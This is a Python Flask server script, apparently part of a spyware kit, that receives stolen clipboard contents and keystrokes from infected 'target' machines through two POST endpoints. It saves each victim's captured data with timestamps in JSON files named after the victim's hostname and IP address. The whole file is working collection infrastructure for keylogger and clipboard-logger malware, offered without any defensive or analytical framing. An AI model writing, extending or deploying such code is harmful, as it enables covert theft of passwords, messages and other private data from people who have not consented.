'''
Product: Data Receive Server
Description: Receives data from the clipboard logger and 
             stores the information in a JSON file
Author: Benjamin Norman 2023
'''

from flask import app, request, Flask, Response
import json
from datetime import datetime
import os

from env import *

app = Flask(__name__)

def file_upload(data, ipAddress, hostname, platform, type):
    
    current_time_utc = datetime.utcnow()
    # Format the time in ISO 8601 format
    formattedDateTime = current_time_utc.isoformat()    
    
    capturedData = {"data":"", "timestamp": "0.0"}
    capturedData["data"] = data
    capturedData["timestamp"] = formattedDateTime

    # TODO Change the file name to that of the hostname of the target machine
    if not os.path.exists(f"{type}_{hostname}_{ipAddress}.json"):
        with open(f"{type}_{hostname}_{ipAddress}.json", 'w'): pass
    with open(f"{type}_{hostname}_{ipAddress}.json", 'r+') as f:
        try:
            file_data = json.load(f)
        except json.decoder.JSONDecodeError:
            file_data = {"Hostname":hostname, "IP Address":ipAddress, "Platform":platform, "data":[]}
            
        file_data["data"].append(capturedData)
        f.seek(0) # Resets the pointer to the start of the file
        json.dump(file_data, f, indent=4)
        f.close()

@app.route('/clipboard_incoming', methods=['POST'])
def clipboard_incoming():
    if request.method == 'POST':
        jsonData = request.get_json()
        
        '''
        Filter by request
        
        Add the data to the relevant hostname JSON file
        along with a timestamp of when it was received.
        
        Due to the limited amount of requests that will be made at once
        no need to batch load them.
        
        '''
        
        if jsonData["apiKey"] == APIKEY:
            file_upload(jsonData["data"], jsonData["ipAddress"], jsonData["hostname"], jsonData["platform"], "clipboard")
            return 'Successful'
        else:
            return Response('Invalid API key', status=400)
    else:
        return Response('Invalid request method', status=400)
    
@app.route('/keylogger_incoming', methods=['POST'])
def keylogger_incoming():
        
        if request.method == 'POST':
            jsonData = request.get_json()
            
            if jsonData["apiKey"] == APIKEY:
                file_upload(jsonData["data"], jsonData["ipAddress"], jsonData["hostname"], jsonData["platform"], "keylogger")
                return 'Successful'
            else:
                return Response('Invalid API key', status=400)
        else:
            return Response('Invalid request method', status=400)
    
if __name__ == '__main__':
    
    app.run(port=SERVERPORT)